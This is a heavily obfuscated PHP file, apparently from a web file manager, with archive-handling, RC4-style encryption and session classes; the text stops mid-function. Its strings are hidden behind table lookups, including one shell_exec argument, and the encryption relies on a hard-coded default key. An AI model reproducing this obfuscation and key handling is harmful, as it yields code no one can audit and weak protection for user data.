<?php
 goto fĞ¥ò®øœÁ; Eæƒ”Æ·Ì¾: define($_SERVER[³‘’¼äÑ™ÔÍ][1944], 5); define($_SERVER[³‘’¼äÑ™ÔÍ][1945], 16); define($_SERVER[³‘’¼äÑ™ÔÍ][1946], 32); goto A‰ˆ¼¯é…¡; F³©Õ÷©Ù¼: class KodArchive { static function init() { goto Aìé§ÄœõÄ; f½¡¡¸ºŒŒ: require_once ARCHIVE_LIB . $BÂ‘£×„©[1902]; require_once ARCHIVE_LIB . $BÂ‘£×„©[1903]; require_once ARCHIVE_LIB . $BÂ‘£×„©[1904]; goto D­†“µµ¶ç; dğ·´­ õÑ: define($BÂ‘£×„©[1896], TEMP_FILES); define($BÂ‘£×„©[1897], TEMP_FILES); define($BÂ‘£×„©[1898], $BÂ‘£×„©[1899]); goto C‰Šö´ÛÑ×; C‰Šö´ÛÑ×: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $BÂ‘£×„©[1900]; require_once ARCHIVE_LIB . $BÂ‘£×„©[1901]; goto f½¡¡¸ºŒŒ; Aìé§ÄœõÄ: $BÂ‘£×„© =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (defined($BÂ‘£×„©[1894])) { return; } define($BÂ‘£×„©[1894], SDK_DIR . $BÂ‘£×„©[1895]); goto dğ·´­ õÑ; D­†“µµ¶ç: require_once ARCHIVE_LIB . $BÂ‘£×„©[1905]; goto e±”äÖèë; e±”äÖèë: } static function checkIfType($BÒÓŒô¤”ª, $f«ùÕ˜±ä) { goto E¯ ìÅŞà¼; E«æ¹Ä§ã: $aÎçœØÔñÚ = in_array($BÒÓŒô¤”ª, $Fì¿‘í•°[$f«ùÕ˜±ä]); if ($aÎçœØÔñÚ && ($f«ùÕ˜±ä == $d ¢®¤ğé›[301] || $f«ùÕ˜±ä == $d ¢®¤ğé›[1909]) && (!function_exists($d ¢®¤ğé›[1917]) || !function_exists($d ¢®¤ğé›[1918]))) { show_tips($d ¢®¤ğé›[1919]); } if ($aÎçœØÔñÚ && $f«ùÕ˜±ä == $d ¢®¤ğé›[1049] && (!function_exists($d ¢®¤ğé›[1920]) || !strstr(shell_exec($d ¢®¤ğé›[1921]), $d ¢®¤ğé›[1922]))) { show_tips($d ¢®¤ğé›[1923]); } goto bŒºêÒ¹Ÿ; E¯ ìÅŞà¼: $d ¢®¤ğé› =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::init(); $Fì¿‘í•° = array($d ¢®¤ğé›[301] => array($d ¢®¤ğé›[301], $d ¢®¤ğé›[1906], $d ¢®¤ğé›[1907], $d ¢®¤ğé›[1908]), $d ¢®¤ğé›[1909] => array($d ¢®¤ğé›[1909], $d ¢®¤ğé›[1910], $d ¢®¤ğé›[1047], $d ¢®¤ğé›[1045]), $d ¢®¤ğé›[1049] => array($d ¢®¤ğé›[1049], $d ¢®¤ğé›[1911], $d ¢®¤ğé›[1912], $d ¢®¤ğé›[1913], $d ¢®¤ğé›[1914], $d ¢®¤ğé›[1915], $d ¢®¤ğé›[1916])); goto E«æ¹Ä§ã; bŒºêÒ¹Ÿ: return $aÎçœØÔñÚ; goto F¾åäŠ©„À; F¾åäŠ©„À: } static function listContent($d¢‹œ¯Î÷Ú, $B©ŸÏ‚Ğ¤Å = true) { $EÏšÄåÉî =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::init(); $Cä¨ƒøãØÑ = !empty($GLOBALS[$EÏšÄåÉî[1053]]) ? $GLOBALS[$EÏšÄåÉî[1053]] : get_path_ext($d¢‹œ¯Î÷Ú); $FåÙËÔ¾Â¡ = !1; if (self::checkIfType($Cä¨ƒøãØÑ, $EÏšÄåÉî[1909])) { $aº¨šÙÛ» = PclTarList($d¢‹œ¯Î÷Ú, $Cä¨ƒøãØÑ); $FåÙËÔ¾Â¡ = array(); for ($eì¥çáÅ = 0; $eì¥çáÅ < count($aº¨šÙÛ»); $eì¥çáÅ++) { $Eåá¸›ËÎ‹ = $aº¨šÙÛ»[$eì¥çáÅ]; if ($Eåá¸›ËÎ‹[$EÏšÄåÉî[1924]] == $EÏšÄåÉî[1925] || $Eåá¸›ËÎ‹[$EÏšÄåÉî[1924]] == $EÏšÄåÉî[1926]) { continue; } if ($B©ŸÏ‚Ğ¤Å) { $Eåá¸›ËÎ‹[$EÏšÄåÉî[1927]] = ltrim($Eåá¸›ËÎ‹[$EÏšÄåÉî[1927]], $EÏšÄåÉî[1161]); } if ($Eåá¸›ËÎ‹[$EÏšÄåÉî[1924]] == $EÏšÄåÉî[1928]) { $Eåá¸›ËÎ‹[$EÏšÄåÉî[76]] = !0; } else { $Eåá¸›ËÎ‹[$EÏšÄåÉî[76]] = !1; } $Eåá¸›ËÎ‹[$EÏšÄåÉî[1040]] = $eì¥çáÅ; $FåÙËÔ¾Â¡[] = $Eåá¸›ËÎ‹; } } else { if (self::checkIfType($Cä¨ƒøãØÑ, $EÏšÄåÉî[1049])) { $e×•ùèÅİ× = kodRarArchive::listContent($d¢‹œ¯Î÷Ú); if (!$e×•ùèÅİ×[$EÏšÄåÉî[1036]]) { return $e×•ùèÅİ×; } else { $FåÙËÔ¾Â¡ = $e×•ùèÅİ×[$EÏšÄåÉî[1038]]; } } else { if (kodZipArchive::support($EÏšÄåÉî[354])) { $FåÙËÔ¾Â¡ = kodZipArchive::listContent($d¢‹œ¯Î÷Ú); } else { $b±ÆÊêßÈğ = new PclZip($d¢‹œ¯Î÷Ú); $FåÙËÔ¾Â¡ = $b±ÆÊêßÈğ->listContent(); } } } if ($FåÙËÔ¾Â¡) { $FÇ°¾¢•Õƒ = unzip_charset_get($FåÙËÔ¾Â¡); $B©ŸÏ‚Ğ¤Å = $B©ŸÏ‚Ğ¤Å && function_exists($EÏšÄåÉî[65]); for ($eì¥çáÅ = 0; $eì¥çáÅ < count($FåÙËÔ¾Â¡); $eì¥çáÅ++) { $FåÙËÔ¾Â¡[$eì¥çáÅ][$EÏšÄåÉî[1927]] = str_replace(array($EÏšÄåÉî[1076], $EÏšÄåÉî[1929]), $EÏšÄåÉî[767], $FåÙËÔ¾Â¡[$eì¥çáÅ][$EÏšÄåÉî[1927]]); if ($B©ŸÏ‚Ğ¤Å) { $FåÙËÔ¾Â¡[$eì¥çáÅ][$EÏšÄåÉî[1927]] = iconv_to($FåÙËÔ¾Â¡[$eì¥çáÅ][$EÏšÄåÉî[1927]], $FÇ°¾¢•Õƒ, $EÏšÄåÉî[326]); unset($FåÙËÔ¾Â¡[$eì¥çáÅ][$EÏšÄåÉî[1930]]); } } return array($EÏšÄåÉî[1036] => !0, $EÏšÄåÉî[1038] => $FåÙËÔ¾Â¡); } else { return array($EÏšÄåÉî[1036] => !1, $EÏšÄåÉî[1038] => $FåÙËÔ¾Â¡); } } static function extract($D±¹±ŞÇß©, $C…õ²é¡ó, $F†Ú˜íÉ¤ = "\x2d\x31", &$AñïÆ×¢™Ù = false) { goto Dæ†ÌÛî©¸; f ÛèÇ‘«”: $AàØÓ¦øÑğ = self::listContent($D±¹±ŞÇß©, !1); if (!$AàØÓ¦øÑğ[$cÓÒ¾‚Ú×[1036]]) { return $AàØÓ¦øÑğ; } if ($F†Ú˜íÉ¤ != $cÓÒ¾‚Ú×[1035]) { goto AÜÒØº»’; b§Şñ¶½ÕÜ: if ($GLOBALS[$cÓÒ¾‚Ú×[6]][$cÓÒ¾‚Ú×[1159]] != $cÓÒ¾‚Ú×[326]) { $E‰ğ²•´…í = unzip_pre_name($AñïÆ×¢™Ù); } $F¬ëÎÕğÜ» = get_path_father($AñïÆ×¢™Ù); if ($F¬ëÎÕğÜ» == $AñïÆ×¢™Ù) { $F¬ëÎÕğÜ» = $cÓÒ¾‚Ú×[33]; } goto bÈã‚äø¼; AÜÒØº»’: $D‹æØÔÌÂ = self::fileIndex($AàØÓ¦øÑğ[$cÓÒ¾‚Ú×[1038]], $F†Ú˜íÉ¤); $AñïÆ×¢™Ù = str_replace(array($cÓÒ¾‚Ú×[1076], $cÓÒ¾‚Ú×[1929]), $cÓÒ¾‚Ú×[70], $D‹æØÔÌÂ[$cÓÒ¾‚Ú×[1927]]); $E‰ğ²•´…í = $AñïÆ×¢™Ù; goto b§Şñ¶½ÕÜ; bÈã‚äø¼: if ($D‹æØÔÌÂ[$cÓÒ¾‚Ú×[76]]) { $E‰ğ²•´…í = rtrim($E‰ğ²•´…í, $cÓÒ¾‚Ú×[8]) . $cÓÒ¾‚Ú×[8]; $AñïÆ×¢™Ù = array($AñïÆ×¢™Ù); } $DÁè‘×ƒ—… = str_replace($cÓÒ¾‚Ú×[93], $cÓÒ¾‚Ú×[8], $E‰ğ²•´…í); if (substr($DÁè‘×ƒ—…, -1) == $cÓÒ¾‚Ú×[8]) { if (!strstr(trim($DÁè‘×ƒ—…, $cÓÒ¾‚Ú×[8]), $cÓÒ¾‚Ú×[8])) { $C…õ²é¡ó = $C…õ²é¡ó . get_path_this($DÁè‘×ƒ—…) . $cÓÒ¾‚Ú×[8]; } } else { if ($F¬ëÎÕğÜ» == $E‰ğ²•´…í) { $F¬ëÎÕğÜ» = $cÓÒ¾‚Ú×[33]; } } goto E‘ÔíÒ·­Ì; E‘ÔíÒ·­Ì: } goto a‡ôÂÊ ğ¾; a‡ôÂÊ ğ¾: if (self::checkIfType($Bçğ§½Ñ™¹, $cÓÒ¾‚Ú×[1909])) { if ($F†Ú˜íÉ¤ != $cÓÒ¾‚Ú×[1035]) { $E‰ğ²•´…í = unzip_pre_name($E‰ğ²•´…í); $F¬ëÎÕğÜ» = unzip_pre_name($F¬ëÎÕğÜ»); $D¥ñ°î‰† = PclTarExtractList($D±¹±ŞÇß©, array($E‰ğ²•´…í), $C…õ²é¡ó, $F¬ëÎÕğÜ», $Bçğ§½Ñ™¹); } else { $D¥ñ°î‰† = PclTarExtract($D±¹±ŞÇß©, $C…õ²é¡ó, $cÓÒ¾‚Ú×[361], $Bçğ§½Ñ™¹); } return array($cÓÒ¾‚Ú×[1036] => $D¥ñ°î‰†, $cÓÒ¾‚Ú×[1038] => PclErrorString(!0)); } else { if (self::checkIfType($Bçğ§½Ñ™¹, $cÓÒ¾‚Ú×[1049])) { return kodRarArchive::extract($D±¹±ŞÇß©, $C…õ²é¡ó, $Bçğ§½Ñ™¹, $AñïÆ×¢™Ù); } else { if (kodZipArchive::support($cÓÒ¾‚Ú×[1931])) { return kodZipArchive::extract($D±¹±ŞÇß©, $C…õ²é¡ó, $AñïÆ×¢™Ù); } else { $Fô„âåà›Š = new PclZip($D±¹±ŞÇß©); if ($F†Ú˜íÉ¤ != $cÓÒ¾‚Ú×[1035]) { $D¥ñ°î‰† = $Fô„âåà›Š->extract(PCLZIP_OPT_PATH, $C…õ²é¡ó, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $cÓÒ¾‚Ú×[1932], PCLZIP_OPT_BY_NAME, $D‹æØÔÌÂ[$cÓÒ¾‚Ú×[1927]], PCLZIP_OPT_REMOVE_PATH, $F¬ëÎÕğÜ», PCLZIP_OPT_REPLACE_NEWER); } else { $D¥ñ°î‰† = $Fô„âåà›Š->extract(PCLZIP_OPT_PATH, $C…õ²é¡ó, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $cÓÒ¾‚Ú×[1932], PCLZIP_OPT_REPLACE_NEWER); } return array($cÓÒ¾‚Ú×[1036] => $D¥ñ°î‰†, $cÓÒ¾‚Ú×[1038] => $Fô„âåà›Š->errorName(!0)); } } } return array($cÓÒ¾‚Ú×[1036] => !1, $cÓÒ¾‚Ú×[1038] => $cÓÒ¾‚Ú×[1933]); goto dÅëÁ•ä¦§; Dæ†ÌÛî©¸: $cÓÒ¾‚Ú× =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::init(); $Bçğ§½Ñ™¹ = !empty($GLOBALS[$cÓÒ¾‚Ú×[1053]]) ? $GLOBALS[$cÓÒ¾‚Ú×[1053]] : get_path_ext($D±¹±ŞÇß©); goto f ÛèÇ‘«”; dÅëÁ•ä¦§: } static function fileIndex($B‹Ø³ÇèÇ, $b©ß¸È£›£, $C »Í‹áÁ = false) { goto d”áö£¸÷ù; c‰Ÿ†«’¦§: $Aó¾ñâˆ‚… = count($B‹Ø³ÇèÇ); for ($Cö™ª›ïò— = 0; $Cö™ª›ïò— < $Aó¾ñâˆ‚…; $Cö™ª›ïò—++) { if ($b©ß¸È£›£ == $B‹Ø³ÇèÇ[$Cö™ª›ïò—][$aÊŸ³’—’‚[1040]]) { $C÷ö’´äàì = $B‹Ø³ÇèÇ[$Cö™ª›ïò—]; break; } } if (!$C÷ö’´äàì) { show_tips($aÊŸ³’—’‚[1934]); } goto A•Œ¥¬–•ƒ; d”áö£¸÷ù: $aÊŸ³’—’‚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::init(); if (!is_array($B‹Ø³ÇèÇ)) { return !1; } goto c‰Ÿ†«’¦§; A•Œ¥¬–•ƒ: $f°íÑ‚…­¥ = $C÷ö’´äàì; if ($C »Í‹áÁ) { $f°íÑ‚…­¥ = $C÷ö’´äàì[$C »Í‹áÁ]; if ($C÷ö’´äàì[$aÊŸ³’—’‚[76]]) { $f°íÑ‚…­¥ = rtrim($f°íÑ‚…­¥, $aÊŸ³’—’‚[8]) . $aÊŸ³’—’‚[8]; } } return $f°íÑ‚…­¥; goto Dâ‡Ùòš®·; Dâ‡Ùòš®·: } static function extractZipFile($c°Â¦…½…®, $fˆŠÑ’Ó„£, $aãÊ¾§÷àí = false) { goto fççÚŞ¡¹”; aØ±ÜßÔÔà: mk_dir($ağ’Ö›ë´É); $AŒô…¸†áå = $ağ’Ö›ë´É . md5($c°Â¦…½…® . $fˆŠÑ’Ó„£); if ($aãÊ¾§÷àí) { $AŒô…¸†áå = $ağ’Ö›ë´É . $aãÊ¾§÷àí; } goto Bø¤êÚÅ÷ã; fççÚŞ¡¹”: $AŞ­…®ïó” =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::init(); $ağ’Ö›ë´É = TEMP_FILES . hash_path($c°Â¦…½…®) . $AŞ­…®ïó”[8]; goto aØ±ÜßÔÔà; eÇ‹Åùõ½¤: $BÊ›œº²§œ = get_path_father($fˆŠÑ’Ó„£); if ($BÊ›œº²§œ == $fˆŠÑ’Ó„£) { $BÊ›œº²§œ = $AŞ­…®ïó”[33]; } $DÁÂ±Ì¸£ = $fñ§‚Š¤íé->extract(PCLZIP_OPT_PATH, $ağ’Ö›ë´É, PCLZIP_CB_PRE_FILE_NAME, $AŞ­…®ïó”[1932], PCLZIP_OPT_REMOVE_PATH, $BÊ›œº²§œ, PCLZIP_OPT_BY_NAME, $fˆŠÑ’Ó„£); goto cÛÌª¢ù¹; cÛÌª¢ù¹: if (!file_exists($AæÖÄ“‹¤«)) { return !1; } @rename($AæÖÄ“‹¤«, $AŒô…¸†áå); return $AŒô…¸†áå; goto Cšñ´†‹«; Bø¤êÚÅ÷ã: if (file_exists($AŒô…¸†áå)) { return $AŒô…¸†áå; } $fñ§‚Š¤íé = new PclZip($c°Â¦…½…®); $AæÖÄ“‹¤« = unzip_filter_ext($ağ’Ö›ë´É . get_path_this($fˆŠÑ’Ó„£)); goto eÇ‹Åùõ½¤; Cšñ´†‹«: } static function filePreview($D…‘ó¸†½³, $CÀ¨–õˆ¨ª, $B¬‘‘¼®†‡ = false, $C„ÎÀ½¢¹ = false) { goto câ—Ã„ŠµŠ; d¤¡àã‘²: $b‰•„‡é” = unzip_pre_name($b‰•„‡é”); $e¡©ìÚ™­Ç = get_path_this($b‰•„‡é”); $e Ç¹©“°Ş = unzip_filter_ext($BìÆÍ¾‰¬• . $e¡©ìÚ™­Ç); goto eÖŞõøé¼â; eÖŞõøé¼â: if (!$FÚ—…Êè[$cÍ²¿…ÕÈ[1036]]) { show_json($FÚ—…Êè[$cÍ²¿…ÕÈ[1038]], !1); } if (!file_exists($e Ç¹©“°Ş)) { show_json($cÍ²¿…ÕÈ[1936], !1); } @rename($e Ç¹©“°Ş, $Aò¬å‡À»†); goto eØµëŸ™; C‚´ÅŠ´Ï‡: mk_dir($BìÆÍ¾‰¬•); $Aò¬å‡À»† = $BìÆÍ¾‰¬• . md5($D…‘ó¸†½³ . $CÀ¨–õˆ¨ª . $C„ÎÀ½¢¹); $b‰•„‡é” = $cÍ²¿…ÕÈ[33]; goto Dåè®±Í; Dåè®±Í: $FÚ—…Êè = self::extract($D…‘ó¸†½³, $BìÆÍ¾‰¬•, $CÀ¨–õˆ¨ª, $b‰•„‡é”); if (is_array($b‰•„‡é”)) { show_json($cÍ²¿…ÕÈ[1935], !1); } if (file_exists($Aò¬å‡À»†)) { IO::fileOut($Aò¬å‡À»†, $B¬‘‘¼®†‡, get_path_this($b‰•„‡é”)); return; } goto d¤¡àã‘²; eØµëŸ™: if (!file_exists($Aò¬å‡À»†)) { del_dir($BìÆÍ¾‰¬•); show_json($cÍ²¿…ÕÈ[1937]); } IO::fileOut($Aò¬å‡À»†, $B¬‘‘¼®†‡, $e¡©ìÚ™­Ç); goto f—ä¥¤Ë¯À; câ—Ã„ŠµŠ: $cÍ²¿…ÕÈ =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::init(); $BìÆÍ¾‰¬• = TEMP_FILES . hash_path($D…‘ó¸†½³) . $cÍ²¿…ÕÈ[8]; goto C‚´ÅŠ´Ï‡; f—ä¥¤Ë¯À: } static function create($Bõèí³Î£Ö, $D¯à¬ô‡¯˜) { $B˜Å†”Õ† =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::init(); $F²§ªÎ­¡ö = get_path_ext($Bõèí³Î£Ö); $AŸ¸Œø¢Š = !1; if (self::checkIfType($F²§ªÎ­¡ö, $B˜Å†”Õ†[301])) { if (kodZipArchive::support($B˜Å†”Õ†[1015])) { return kodZipArchive::create($Bõèí³Î£Ö, $D¯à¬ô‡¯˜); } $D‘³ˆ´Æ•ô = new PclZip($Bõèí³Î£Ö); foreach ($D¯à¬ô‡¯˜ as $c¿ÛÉëŸø© => $fÌ×ÚŒ¨“) { $fÌ×ÚŒ¨“ = str_replace($B˜Å†”Õ†[467], $B˜Å†”Õ†[8], $fÌ×ÚŒ¨“); $Fë¨èİ¶²İ = Kodio::clear(get_path_father($fÌ×ÚŒ¨“)); if ($c¿ÛÉëŸø© == 0) { $AŸ¸Œø¢Š = $D‘³ˆ´Æ•ô->create($fÌ×ÚŒ¨“, PCLZIP_OPT_REMOVE_PATH, $Fë¨èİ¶²İ, PCLZIP_CB_PRE_FILE_NAME, $B˜Å†”Õ†[1938]); continue; } $AŸ¸Œø¢Š = $D‘³ˆ´Æ•ô->add($fÌ×ÚŒ¨“, PCLZIP_OPT_REMOVE_PATH, $Fë¨èİ¶²İ, PCLZIP_CB_PRE_FILE_NAME, $B˜Å†”Õ†[1938]); } } else { if (self::checkIfType($F²§ªÎ­¡ö, $B˜Å†”Õ†[1909])) { foreach ($D¯à¬ô‡¯˜ as $c¿ÛÉëŸø© => $fÌ×ÚŒ¨“) { $fÌ×ÚŒ¨“ = str_replace($B˜Å†”Õ†[467], $B˜Å†”Õ†[8], $fÌ×ÚŒ¨“); $Fë¨èİ¶²İ = Kodio::clear(get_path_father($fÌ×ÚŒ¨“)); if ($c¿ÛÉëŸø© == 0) { $AŸ¸Œø¢Š = PclTarCreate($Bõèí³Î£Ö, array($fÌ×ÚŒ¨“), $F²§ªÎ­¡ö, null, $Fë¨èİ¶²İ); continue; } $AŸ¸Œø¢Š = PclTarAddList($Bõèí³Î£Ö, array($fÌ×ÚŒ¨“), $B˜Å†”Õ†[33], $Fë¨èİ¶²İ, $F²§ªÎ­¡ö); } } } return $AŸ¸Œø¢Š; } } class Mcrypt { public static $defaultKey = "\141\x21\164\x61\153\101\72\x64\x6c\x6d\143\154\x64\x45\166\x2c\x65"; public static function encode($C·¬Ğ¹§¥â, $A¨¾¿Í”É = '', $Bõ©¼÷Šß¶ = 0, $c›æ¶•øÖ¢ = '') { goto bØè©½çÊ¨; d’ÖïÂ’ÁÌ: for ($få¹ÎÚ”áå = 0; $få¹ÎÚ”áå <= 255; $få¹ÎÚ”áå++) { $e§íŒ¬ƒğá[$få¹ÎÚ”áå] = ord($cš“¹¹Ùä[$få¹ÎÚ”áå % $D¬Æ¿ß•ğÑ]); } $F²“øÍÛ¬à = range(0, 255); for ($a ùöĞ›…á = $få¹ÎÚ”áå = 0; $få¹ÎÚ”áå < 256; $få¹ÎÚ”áå++) { $a ùöĞ›…á = ($a ùöĞ›…á + $F²“øÍÛ¬à[$få¹ÎÚ”áå] + $e§íŒ¬ƒğá[$få¹ÎÚ”áå]) % 256; $FíÀÒÎ¯ñ• = $F²“øÍÛ¬à[$få¹ÎÚ”áå]; $F²“øÍÛ¬à[$få¹ÎÚ”áå] = $F²“øÍÛ¬à[$a ùöĞ›…á]; $F²“øÍÛ¬à[$a ùöĞ›…á] = $FíÀÒÎ¯ñ•; } goto Eà“­ÚŠ“È; D³Ñîæ«æŸ: $C·¬Ğ¹§¥â = sprintf($D¦Äğñœº[1939], $Bõ©¼÷Šß¶ ? $Bõ©¼÷Šß¶ + time() : 0) . substr(md5($C·¬Ğ¹§¥â . $F³¦ß¯ç’í), 0, 16) . $C·¬Ğ¹§¥â; $cï«‰Ğ¦™ì = strlen($C·¬Ğ¹§¥â); $e§íŒ¬ƒğá = array(); goto d’ÖïÂ’ÁÌ; bØè©½çÊ¨: $D¦Äğñœº =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f–çÄŠ’¸ = 4; $A¨¾¿Í”É = md5($A¨¾¿Í”É ? $A¨¾¿Í”É : self::$defaultKey); goto c‰êŒ«ó; c‰êŒ«ó: $b‘‰èÑ¡‘Ë = md5(substr($A¨¾¿Í”É, 0, 16)); $F³¦ß¯ç’í = md5(substr($A¨¾¿Í”É, 16, 16)); $c›æ¶•øÖ¢ = $c›æ¶•øÖ¢ ? $c›æ¶•øÖ¢ : md5(microtime()); goto A»İÕºÙ®; A»İÕºÙ®: $eØÇ‚ºª‰ = substr($c›æ¶•øÖ¢, -$f–çÄŠ’¸); $cš“¹¹Ùä = $b‘‰èÑ¡‘Ë . md5($b‘‰èÑ¡‘Ë . $eØÇ‚ºª‰); $D¬Æ¿ß•ğÑ = strlen($cš“¹¹Ùä); goto D³Ñîæ«æŸ; Eà“­ÚŠ“È: $d‡êª£®İ“ = $D¦Äğñœº[33]; for ($cÏç‹ª·ï = $a ùöĞ›…á = $få¹ÎÚ”áå = 0; $få¹ÎÚ”áå < $cï«‰Ğ¦™ì; $få¹ÎÚ”áå++) { $cÏç‹ª·ï = ($cÏç‹ª·ï + 1) % 256; $a ùöĞ›…á = ($a ùöĞ›…á + $F²“øÍÛ¬à[$cÏç‹ª·ï]) % 256; $FíÀÒÎ¯ñ• = $F²“øÍÛ¬à[$cÏç‹ª·ï]; $F²“øÍÛ¬à[$cÏç‹ª·ï] = $F²“øÍÛ¬à[$a ùöĞ›…á]; $F²“øÍÛ¬à[$a ùöĞ›…á] = $FíÀÒÎ¯ñ•; $d‡êª£®İ“ .= chr(ord($C·¬Ğ¹§¥â[$få¹ÎÚ”áå]) ^ $F²“øÍÛ¬à[($F²“øÍÛ¬à[$cÏç‹ª·ï] + $F²“øÍÛ¬à[$a ùöĞ›…á]) % 256]); } $d‡êª£®İ“ = $eØÇ‚ºª‰ . str_replace($D¦Äğñœº[911], $D¦Äğñœº[33], base64_encode($d‡êª£®İ“)); goto aŞ‡÷ˆ¥¬; aŞ‡÷ˆ¥¬: $d‡êª£®İ“ = str_replace(array($D¦Äğñœº[284], $D¦Äğñœº[8], $D¦Äğñœº[911]), array($D¦Äğñœº[412], $D¦Äğñœº[70], $D¦Äğñœº[91]), $d‡êª£®İ“); return $d‡êª£®İ“; goto Bè¬¶”èëÓ; Bè¬¶”èëÓ: } public static function decode($A…Ñß¶Í, $E˜®Û¾¬ë = '') { goto cÊ¢Õ÷™•ñ; bõ„ƒ’ŸŒˆ: $CæÖèÕŠ³ì = $DİÙ²ƒ‰åÏ[33]; for ($b÷ãË‡Ö¶§ = $D˜áÅÛŠÂ = $b’îÄ¤îõÍ = 0; $b’îÄ¤îõÍ < $E¡Ìš®³µÙ; $b’îÄ¤îõÍ++) { $b÷ãË‡Ö¶§ = ($b÷ãË‡Ö¶§ + 1) % 256; $D˜áÅÛŠÂ = ($D˜áÅÛŠÂ + $CéÑ»¥¥ê[$b÷ãË‡Ö¶§]) % 256; $bÓº…¹½ = $CéÑ»¥¥ê[$b÷ãË‡Ö¶§]; $CéÑ»¥¥ê[$b÷ãË‡Ö¶§] = $CéÑ»¥¥ê[$D˜áÅÛŠÂ]; $CéÑ»¥¥ê[$D˜áÅÛŠÂ] = $bÓº…¹½; $CæÖèÕŠ³ì .= chr(ord($A…Ñß¶Í[$b’îÄ¤îõÍ]) ^ $CéÑ»¥¥ê[($CéÑ»¥¥ê[$b÷ãË‡Ö¶§] + $CéÑ»¥¥ê[$D˜áÅÛŠÂ]) % 256]); } $AÕÙ¿õ¥« = intval(substr($CæÖèÕŠ³ì, 0, 10)); goto bõê÷öæĞ; fÌ‚å Øøä: $CŠ÷ÄÚÄëâ = substr($A…Ñß¶Í, 0, $E»†ÜöåŠ­); $aùôä—·ïé = $e‹ªÌ½©¾¨ . md5($e‹ªÌ½©¾¨ . $CŠ÷ÄÚÄëâ); $cİŸù¡¿éª = strlen($aùôä—·ïé); goto E–¦¡÷½×—; cÊ¢Õ÷™•ñ: $DİÙ²ƒ‰åÏ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A…Ñß¶Í = str_replace(array($DİÙ²ƒ‰åÏ[412], $DİÙ²ƒ‰åÏ[70], $DİÙ²ƒ‰åÏ[91]), array($DİÙ²ƒ‰åÏ[284], $DİÙ²ƒ‰åÏ[8], $DİÙ²ƒ‰åÏ[911]), $A…Ñß¶Í); $E»†ÜöåŠ­ = 4; goto aà©Ë™ˆ³ƒ; e…’ÓÏ¨•: for ($b’îÄ¤îõÍ = 0; $b’îÄ¤îõÍ <= 255; $b’îÄ¤îõÍ++) { $C÷Îëä¦‚·[$b’îÄ¤îõÍ] = ord($aùôä—·ïé[$b’îÄ¤îõÍ % $cİŸù¡¿éª]); } $CéÑ»¥¥ê = range(0, 255); for ($D˜áÅÛŠÂ = $b’îÄ¤îõÍ = 0; $b’îÄ¤îõÍ < 256; $b’îÄ¤îõÍ++) { $D˜áÅÛŠÂ = ($D˜áÅÛŠÂ + $CéÑ»¥¥ê[$b’îÄ¤îõÍ] + $C÷Îëä¦‚·[$b’îÄ¤îõÍ]) % 256; $bÓº…¹½ = $CéÑ»¥¥ê[$b’îÄ¤îõÍ]; $CéÑ»¥¥ê[$b’îÄ¤îõÍ] = $CéÑ»¥¥ê[$D˜áÅÛŠÂ]; $CéÑ»¥¥ê[$D˜áÅÛŠÂ] = $bÓº…¹½; } goto bõ„ƒ’ŸŒˆ; bõê÷öæĞ: if (($AÕÙ¿õ¥« == 0 || $AÕÙ¿õ¥« - time() > 0) && substr($CæÖèÕŠ³ì, 10, 16) == substr(md5(substr($CæÖèÕŠ³ì, 26) . $cå’àçæìÃ), 0, 16)) { return substr($CæÖèÕŠ³ì, 26); } else { return $DİÙ²ƒ‰åÏ[33]; } goto dªŞãÌô‡; aà©Ë™ˆ³ƒ: $E˜®Û¾¬ë = md5($E˜®Û¾¬ë ? $E˜®Û¾¬ë : self::$defaultKey); $e‹ªÌ½©¾¨ = md5(substr($E˜®Û¾¬ë, 0, 16)); $cå’àçæìÃ = md5(substr($E˜®Û¾¬ë, 16, 16)); goto fÌ‚å Øøä; E–¦¡÷½×—: $A…Ñß¶Í = base64_decode(substr($A…Ñß¶Í, $E»†ÜöåŠ­)); $E¡Ìš®³µÙ = strlen($A…Ñß¶Í); $C÷Îëä¦‚· = array(); goto e…’ÓÏ¨•; dªŞãÌô‡: } } define($_SERVER[³‘’¼äÑ™ÔÍ][1940], 1); goto fŸ˜å·ŠˆÄ; Bî³ší¢¡…: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto DÔÍ¿‡ÌÕÃ; céß¡Â§Š´: $EÄ—¾»ÖÔ = _get($GLOBALS, $Eå™•‘É´ê[1406], $EÄ—¾»ÖÔ); if (self::$sessionSign) { } else { if (Cookie::get($EÄ—¾»ÖÔ)) { self::$sessionSign = Cookie::get($EÄ—¾»ÖÔ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($EÄ—¾»ÖÔ, self::$sessionSign, self::$sessionTime); goto bÑÎŒÙÒæÌ; DÔÍ¿‡ÌÕÃ: $Eå™•‘É´ê =& $_SERVER[³‘’¼äÑ™ÔÍ]; static $b´ŒÏ²İÉ = false; if ($b´ŒÏ²İÉ) { return $b´ŒÏ²İÉ; } goto cœí¹®ÖË‡; d§ÜõµŞã: switch ($E¾ß××Ş“) { case $Eå™•‘É´ê[17]: self::$handle = Model($Eå™•‘É´ê[760]); break; case $Eå™•‘É´ê[761]: self::$handle = new CacheRedis($cğŞñ…‰èÃ, $eĞ–«Â™·›); break; case $Eå™•‘É´ê[762]: self::$handle = new CacheMemcached($cğŞñ…‰èÃ, $eĞ–«Â™·›); break; case $Eå™•‘É´ê[167]: $cğŞñ…‰èÃ[$Eå™•‘É´ê[75]] = $cğŞñ…‰èÃ[$Eå™•‘É´ê[75]] . $Eå™•‘É´ê[1408]; self::$handle = new CacheFile($cğŞñ…‰èÃ, $eĞ–«Â™·›); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } 